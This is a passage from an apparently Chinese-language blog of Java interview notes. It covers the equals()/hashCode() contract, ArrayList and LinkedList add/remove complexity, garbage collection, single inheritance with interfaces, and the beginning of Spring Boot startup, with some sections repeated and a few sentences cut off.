title="Java的基本约定："></a>Java的基本约定：</h5><p>Java规定了<code>equals()</code>与<code>hashCode()</code>之间的约定，以保证哈希集合类的正常运行：</p><ul><li><strong>如果两个对象通过<code>equals()</code>方法比较相等（即<code>obj1.equals(obj2)</code>返回<code>true</code>），那么它们的<code>hashCode()</code>也必须相等</strong>。这确保了在哈希表结构中，<code>obj1</code>和<code>obj2</code>会被放到相同的桶中。</li><li><strong>如果两个对象通过<code>equals()</code>方法不相等，那么它们的<code>hashCode()</code>可以相同</strong>（虽然这不影响正确性，但会降低性能），这称为哈希冲突。</li></ul><h5 id="如果不遵守这个约定，会发生什么？"><a href="#如果不遵守这个约定，会发生什么？" class="headerlink" title="如果不遵守这个约定，会发生什么？"></a>如果不遵守这个约定，会发生什么？</h5><p>如果只重写了<code>equals()</code>而没有重写<code>hashCode()</code>，就可能违反上述约定，导致以下问题：</p><ol><li><strong>哈希集合无法正确存储对象</strong>： 比如在<code>HashSet</code>中，如果两个对象被认为是相等的（通过<code>equals()</code>），但它们的<code>hashCode()</code>不同，那么在添加这些对象到<code>HashSet</code>时，它们会被放入不同的桶中，<code>HashSet</code>会错误地认为它们是不同的对象，导致集合中有重复对象。</li><li><strong>哈希表无法正确查找对象</strong>： 在<code>HashMap</code>中，如果存储了一个对象<code>obj1</code>，而要查找另一个”相等”的对象<code>obj2</code>（即<code>obj1.equals(obj2)</code>为<code>true</code>），如果<code>obj1</code>和<code>obj2</code>的<code>hashCode()</code>不同，<code>HashMap</code>会去不同的桶中查找，可能找不到对象，即使<code>equals()</code>表明它们相等。</li></ol><p>在Java中，<code>hashCode()</code>和<code>equals()</code>方法有着密切的关系，特别是在使用哈希集合类（如<code>HashSet</code>、<code>HashMap</code>等）时。如果只重写了<code>equals()</code>方法，而不重写<code>hashCode()</code>，可能会导致程序行为不符合预期。</p><h5 id="equals-和hashCode-的作用：-1"><a href="#equals-和hashCode-的作用：-1" class="headerlink" title="equals()和hashCode()的作用："></a><code>equals()</code>和<code>hashCode()</code>的作用：</h5><ol><li><strong><code>equals()</code><strong>：用来比较两个对象是否”相等”。默认情况下，<code>equals()</code>方法比较的是对象的</strong>引用</strong>（地址），但通常我们会根据对象的<strong>属性</strong>来判断两个对象是否相等，所以需要重写<code>equals()</code>方法。</li><li><strong><code>hashCode()</code><strong>：返回一个对象的</strong>哈希码</strong>，它是对象的一个整数表示，主要用于哈希表中的<strong>快速查找</strong>。在默认实现中，<code>hashCode()</code>方法基于对象的内存地址生成。</li></ol><h5 id="为什么重写equals-方法后，必须重写hashCode-方法？-1"><a href="#为什么重写equals-方法后，必须重写hashCode-方法？-1" class="headerlink" title="为什么重写equals()方法后，必须重写hashCode()方法？"></a>为什么重写<code>equals()</code>方法后，必须重写<code>hashCode()</code>方法？</h5><h5 id="Java的基本约定：-1"><a href="#Java的基本约定：-1" class="headerlink" title="Java的基本约定："></a>Java的基本约定：</h5><p>Java规定了<code>equals()</code>与<code>hashCode()</code>之间的约定，以保证哈希集合类的正常运行：</p><ul><li><strong>如果两个对象通过<code>equals()</code>方法比较相等（即<code>obj1.equals(obj2)</code>返回<code>true</code>），那么它们的<code>hashCode()</code>也必须相等</strong>。这确保了在哈希表结构中，<code>obj1</code>和<code>obj2</code>会被放到相同的桶中。</li><li><strong>如果两个对象通过<code>equals()</code>方法不相等，那么它们的<code>hashCode()</code>可以相同</strong>（虽然这不影响正确性，但会降低性能），这称为哈希冲突。</li></ul><h5 id="如果不遵守这个约定，会发生什么？-1"><a href="#如果不遵守这个约定，会发生什么？-1" class="headerlink" title="如果不遵守这个约定，会发生什么？"></a>如果不遵守这个约定，会发生什么？</h5><p>如果只重写了<code>equals()</code>而没有重写<code>hashCode()</code>，就可能违反上述约定，导致以下问题：</p><ol><li><strong>哈希集合无法正确存储对象</strong>： 比如在<code>HashSet</code>中，如果两个对象被认为是相等的（通过<code>equals()</code>），但它们的<code>hashCode()</code>不同，那么在添加这些对象到<code>HashSet</code>时，它们会被放入不同的桶中，<code>HashSet</code>会错误地认为它们是不同的对象，导致集合中有重复对象。</li><li><strong>哈希表无法正确查找对象</strong>： 在<code>HashMap</code>中，如果存储了一个对象<code>obj1</code>，而要查找另一个”相等”的对象<code>obj2</code>（即<code>obj1.equals(obj2)</code>为<code>true</code>），如果<code>obj1</code>和<code>obj2</code>的<code>hashCode()</code>不同，<code>HashMap</code>会去不同的桶中查找，可能找不到对象，即使<code>equals()</code>表明它们相等。</li></ol><h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><p>假设我们有一个简单的类<code>Person</code>，只根据名字和年龄来判断相等性：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> o<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span> o<span class="token punctuation">;</span>        <span class="token keyword">return</span> age <span class="token operator">==</span> person<span class="token punctuation">.</span>age <span class="token operator">&amp;&amp;</span> name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 假设没有重写 hashCode()</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的代码中，<code>equals()</code>已经重写，两个<code>Person</code>对象如果名字和年龄相同会被认为是相等的。但如果没有重写<code>hashCode()</code>，比如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 期望p1和p2相等，但实际上它们被认为是不同的对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于没有重写<code>hashCode()</code>，即使<code>p1.equals(p2)</code>为<code>true</code>，它们的<code>hashCode()</code>可能不同，导致<code>HashSet</code>认为它们是不同的对象，<code>set</code>会错误地存储两个相等的对象。</p><h5 id="正确的做法："><a href="#正确的做法：" class="headerlink" title="正确的做法："></a>正确的做法：</h5><p>为了避免这个问题，重写<code>equals()</code>时，必须同时重写<code>hashCode()</code>。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样，两个对象如果通过<code>equals()</code>相等，它们的<code>hashCode()</code>也会相等。</p><h5 id="总结：-2"><a href="#总结：-2" class="headerlink" title="总结："></a>总结：</h5><ul><li><strong><code>equals()</code>决定两个对象是否相等</strong>。</li><li><strong><code>hashCode()</code>决定两个对象是否可以放入同一个哈希桶</strong>。</li><li>如果只重写<code>equals()</code>而不重写<code>hashCode()</code>，会破坏哈希集合的行为，导致错误的存储和查找结</li></ul><h4 id="5-list的add和remove操作"><a href="#5-list的add和remove操作" class="headerlink" title="5. list的add和remove操作"></a>5. list的add和remove操作</h4><p>在 Java 中，<code>List</code> 接口常用于处理有序的集合，提供了一些常用的操作方法，比如 <code>add</code> 和 <code>remove</code>。它的常见实现类有 <code>ArrayList</code> 和 <code>LinkedList</code>，它们的 <code>add</code> 和 <code>remove</code> 方法的性能可能会有所不同。</p><h5 id="add-操作"><a href="#add-操作" class="headerlink" title="add 操作"></a><code>add</code> 操作</h5><p><code>List</code> 的 <code>add</code> 方法有两个重载版本：</p><ol><li><p>**<code>boolean add(E e)</code>**：在列表的末尾追加一个元素。</p><ul><li><p>时间复杂度：</p><ul><li>对于 <code>ArrayList</code>，如果没有扩容，时间复杂度为 **O(1)**；如果扩容，则为 **O(n)**，因为需要重新分配内存并复制现有元素。</li><li>对于 <code>LinkedList</code>，时间复杂度为 **O(1)**，因为它只是在链表末尾添加一个节点。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>**<code>void add(int index, E element)</code>**：在指定位置插入一个元素。</p><ul><li><p>时间复杂度：</p><ul><li>对于 <code>ArrayList</code>，时间复杂度为 **O(n)**，因为需要移动插入点后面的所有元素。</li><li>对于 <code>LinkedList</code>，时间复杂度为 **O(n)**，因为需要遍历到指定索引处，找到插入位置。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 插入到索引 0 位置</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 插入到索引 1 位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><h5 id="remove-操作"><a href="#remove-操作" class="headerlink" title="remove 操作"></a><code>remove</code> 操作</h5><p><code>List</code> 的 <code>remove</code> 方法也有两个重载版本：</p><ol><li><p>**<code>E remove(int index)</code>**：根据索引删除指定位置的元素。</p><ul><li><p>时间复杂度：</p><ul><li>对于 <code>ArrayList</code>，时间复杂度为 **O(n)**，因为需要移动被删除元素后面的所有元素。</li><li>对于 <code>LinkedList</code>，时间复杂度为 **O(n)**，因为需要遍历链表找到指定索引，并执行删除。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 删除索引 1 位置的 "banana"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>**<code>boolean remove(Object o)</code>**：根据对象内容删除第一个匹配的元素。</p><ul><li><p>时间复杂度：</p><ul><li>对于 <code>ArrayList</code>，时间复杂度为 **O(n)**，因为需要遍历整个列表找到要删除的对象。</li><li>对于 <code>LinkedList</code>，时间复杂度为 **O(n)**，因为也需要遍历链表找到要删除的对象。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 删除第一个匹配的 "apple"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><ul><li>add 和  remove 操作在  ArrayList 和 LinkedList 中的性能有差异，具体取决于它们的内部实现方式。<ul><li>**<code>ArrayList</code>**：在末尾添加元素通常是 **O(1)**，但在中间插入或删除则需要移动元素，时间复杂度为 **O(n)**。</li><li>**<code>LinkedList</code>**：在任意位置添加或删除元素不需要移动其他元素，但由于链表需要遍历，性能为 **O(n)**。</li></ul></li></ul><p>根据具体的需求，选择合适的 <code>List</code> 实现类会对程序性能产生影</p><h4 id="6-java的垃圾回收机制"><a href="#6-java的垃圾回收机制" class="headerlink" title="6. java的垃圾回收机制"></a>6. java的垃圾回收机制</h4><p>Java 的垃圾回收机制（Garbage Collection，简称 GC）是自动管理内存的功能，开发者不需要显式地释放对象的内存，垃圾回收器会自动检测和释放不再使用的对象，从而防止内存泄漏并优化内存使用。</p><h4 id="7-Java-垃圾回收机制的基本原理"><a href="#7-Java-垃圾回收机制的基本原理" class="headerlink" title="7. Java 垃圾回收机制的基本原理"></a>7. Java 垃圾回收机制的基本原理</h4><p>Java 使用 <strong>堆内存（Heap）</strong> 来存储对象。当程序创建新对象时，系统会在堆中分配内存，随着时间的推移，有些对象可能不会再被引用，这些对象就变成了 <strong>垃圾</strong>。垃圾回收机制的目标是：</p><ol><li>自动检测哪些对象已经不再被引用；</li><li>释放这些对象占用的内存；</li><li>使程序内存使用更加高效。</li></ol><h5 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h5><p>Java 垃圾回收机制的核心是使用不同的算法来自动管理堆内存。常见的垃圾回收算法包括：</p><h6 id="1-标记-清除算法（Mark-Sweep）"><a href="#1-标记-清除算法（Mark-Sweep）" class="headerlink" title="1. 标记-清除算法（Mark-Sweep）"></a>1. <strong>标记-清除算法（Mark-Sweep）</strong></h6><ul><li>步骤：<ol><li><strong>标记（Marking）</strong>：垃圾回收器会扫描所有活动对象，并将它们标记为存活。</li><li><strong>清除（Sweep）</strong>：未被标记的对象会被认为是垃圾，系统将清除它们，释放对应的内存。</li></ol></li><li><strong>问题</strong>：虽然能够回收垃圾对象，但可能会导致内存碎片化，因为清除后内存空间并不会被紧凑排列。</li></ul><h6 id="2-标记-整理算法（Mark-Compact）"><a href="#2-标记-整理算法（Mark-Compact）" class="headerlink" title="2. 标记-整理算法（Mark-Compact）"></a>2. <strong>标记-整理算法（Mark-Compact）</strong></h6><ul><li>步骤：<ol><li>先执行和标记-清除算法一样的标记过程。</li><li>然后通过整理步骤，将存活的对象移动到内存的一端，形成连续的内存块，消除碎片化问题。</li></ol></li><li><strong>优势</strong>：避免了内存碎片问题，内存分配效率更高。</li></ul><h6 id="3-复制算法（Copying）"><a href="#3-复制算法（Copying）" class="headerlink" title="3. 复制算法（Copying）"></a>3. <strong>复制算法（Copying）</strong></h6><ul><li>将内存区域划分为两部分（通常是新生代使用）：活动对象总是位于一部分，当这部分内存用完时，垃圾回收器会将存活的对象复制到另一块内存区域，之后清除原来的区域。</li><li><strong>优势</strong>：这种方式可以快速回收内存，不需要额外的清除或整理步骤。</li><li><strong>缺点</strong>：需要更多的内存，因为它依赖于内存区域划分为两部分。</li></ul><h5 id="内存划分及垃圾回收器"><a href="#内存划分及垃圾回收器" class="headerlink" title="内存划分及垃圾回收器"></a>内存划分及垃圾回收器</h5><p>Java 的堆内存分为 <strong>新生代（Young Generation）</strong> 和 <strong>老年代（Old Generation）</strong>。不同的垃圾回收器使用了这些划分来管理不同生命周期的对象。</p><ul><li><strong>新生代</strong>：用于存放刚刚创建的对象，分为三个区域：<strong>Eden</strong> 区、<strong>Survivor</strong> 区（S0、S1）。大部分对象会在新生代中创建并快速回收。新生代的回收称为 <strong>Minor GC</strong>。</li><li><strong>老年代</strong>：存放生命周期较长的对象，这些对象在多次 Minor GC 后仍存活下来，会被移动到老年代。老年代的回收称为 <strong>Major GC</strong> 或 <strong>Full GC</strong>。</li></ul><h5 id="常见垃圾回收器"><a href="#常见垃圾回收器" class="headerlink" title="常见垃圾回收器"></a>常见垃圾回收器</h5><ol><li><strong>Serial GC</strong>：单线程垃圾回收器，适用于单线程应用。</li><li><strong>Parallel GC</strong>：多线程垃圾回收器，使用多个线程并行处理垃圾回收，适用于多核 CPU 的服务器。</li><li><strong>CMS（Concurrent Mark-Sweep）GC</strong>：并发垃圾回收器，减少了应用暂停时间，适用于需要低延迟的应用。</li><li><strong>G1（Garbage First）GC</strong>：专为大内存、低延迟的应用设计，分区收集内存，提供更好的性能。</li></ol><h5 id="垃圾回收触发时机"><a href="#垃圾回收触发时机" class="headerlink" title="垃圾回收触发时机"></a>垃圾回收触发时机</h5><p>垃圾回收器在以下情况会被触发：</p><ol><li>新生代满了，触发 Minor GC；</li><li>老年代满了，触发 Major GC 或 Full GC；</li><li>手动调用 <code>System.gc()</code>，会建议垃圾回收器运行（但不是强制）。</li></ol><h5 id="垃圾回收优化"><a href="#垃圾回收优化" class="headerlink" title="垃圾回收优化"></a>垃圾回收优化</h5><p>通过调整堆大小、垃圾回收算法和线程，可以优化 Java 应用的性能：</p><ul><li>调整堆内存大小：<code>-Xms</code> 设置初始堆大小，<code>-Xmx</code> 设置最大堆大小。</li><li>调整新生代和老年代比例：通过参数如 <code>-XX:NewRatio</code> 调整比例。</li><li>选择合适的垃圾回收器：例如 <code>-XX:+UseG1GC</code> 使用 G1 GC。</li></ul><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>Java 的垃圾回收机制通过多种算法和回收器，实现了自动内存管理，极大地简化了开发者的内存操作负担。合理配置垃圾回收器可以提升程序的性能，尤其是针对大规模、高并发的应用。</p><h4 id="8-java是多继承吗"><a href="#8-java是多继承吗" class="headerlink" title="8. java是多继承吗"></a>8. java是多继承吗</h4><p>Java <strong>不是</strong>多继承的语言。它不允许一个类继承多个类，即 <strong>类的多继承</strong> 在 Java 中是不支持的。Java 只允许一个类通过 <code>extends</code> 关键字继承自一个父类，这样可以避免多继承中的 <strong>菱形继承问题</strong>（即多个父类有相同的方法，子类不确定调用哪个版本）。</p><h5 id="为什么-Java-不支持多继承？"><a href="#为什么-Java-不支持多继承？" class="headerlink" title="为什么 Java 不支持多继承？"></a>为什么 Java 不支持多继承？</h5><p>多继承容易引发复杂性，尤其是在以下两种情况下：</p><ol><li><p><strong>菱形继承问题</strong>：当两个父类有同名的字段或方法时，子类继承时会遇到冲突，可能不知道应该使用哪个父类的实现。</p><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Class A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Class B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 如果类 C 继承 A 和 B，会不知道调用哪个 display 方法。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>增加复杂性</strong>：维护代码会变得困难，因为子类需要同时处理多个父类的行为和状态。</p></li></ol><h5 id="Java-提供的替代方案：接口"><a href="#Java-提供的替代方案：接口" class="headerlink" title="Java 提供的替代方案：接口"></a>Java 提供的替代方案：接口</h5><p>虽然 Java 不支持类的多继承，但它允许一个类实现多个接口，这可以作为多继承的替代方案。</p><ul><li><strong>接口</strong>：接口定义了一组抽象方法，任何类都可以通过 <code>implements</code> 关键字实现多个接口，从而获取多种行为特性。接口没有方法的具体实现，不会带来多继承中方法冲突的问题。</li></ul><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">interface</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">interface</span> <span class="token class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token keyword">implements</span> <span class="token class-name">A</span><span class="token punctuation">,</span> <span class="token class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Implementing display from A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Implementing show from B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">C</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出: Implementing display from A</span>        obj<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 输出: Implementing show from B</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Java-8-的默认方法"><a href="#Java-8-的默认方法" class="headerlink" title="Java 8 的默认方法"></a>Java 8 的默认方法</h5><p>Java 8 引入了接口的 <strong>默认方法（default methods）</strong>，即接口中的方法可以有默认的实现。这意味着接口的实现类不需要重新实现这些默认方法，但如果实现类需要，可以覆盖它们。</p><p>如果一个类实现了多个接口，并且这些接口有相同的默认方法实现，那么子类必须<strong>明确指定</strong>使用哪个接口的方法实现，避免冲突。</p><p>总结：</p><ul><li>Java 不支持类的多继承，但支持接口的多继承。</li><li>通过接口和接口的默认方法，Java 提供了功能上类似多继承的能力，同时避免了多继承的复杂性。</li></ul><h4 id="9-spring-boot-项目如何启动"><a href="#9-spring-boot-项目如何启动" class="headerlink" title="9. spring boot 项目如何启动"></a>9. spring boot 项目如何启动</h4><p>在 <strong>Spring Boot</strong> 项目中，各个模块之间的启动和交互依赖于 <strong>Spring 框架</strong> 的核心特性，如 <strong>依赖注入</strong>、<strong>自动配置</strong> 和 <strong>组件扫描</strong>。下面是这些模块如何相互启动和协作的一个概述：</p><h5 id="1-启动类（BaselinecheckApplication-java）的启动流程"><a href="#1-启动类（BaselinecheckApplication-java）的启动流程" class="headerlink" title="1. 启动类（BaselinecheckApplication.java）的启动流程"></a>1. <strong>启动类（<code>BaselinecheckApplication.java</code>）的启动流程</strong></h5><ul><li><p>Spring Boot 项目的启动类通常带有 <code>@SpringBootApplication</code> 注解。</p></li><li><pre><code>@SpringBootApplication</code></pre><p> 是一个复合注解，包含了以下重要功能：</p><ul><li><code>@EnableAutoConfiguration</code>：启用 Spring Boot 的自动配置机制，会根据项目中的依赖自动配置相关的 bean。</li><li><code>@ComponentScan</code>：启用组件扫描，扫描当前包及其子包下的所有 Spring 组件（如 <code>@Controller</code>, <code>@Service</code>, <code>@Repository</code>, <code>@Component</code> 等）。</li><li><code>@Configuration</code>：标记该类为一个配置类，等价于 <code>@Configuration</code>，使其能够定义 <code>@Bean</code>。</li></ul></li><li><p>当 <code>main()</code> 方法调用 <code>SpringApplication.run()</code> 时，Spring Boot 会启动应用，创建 Spring 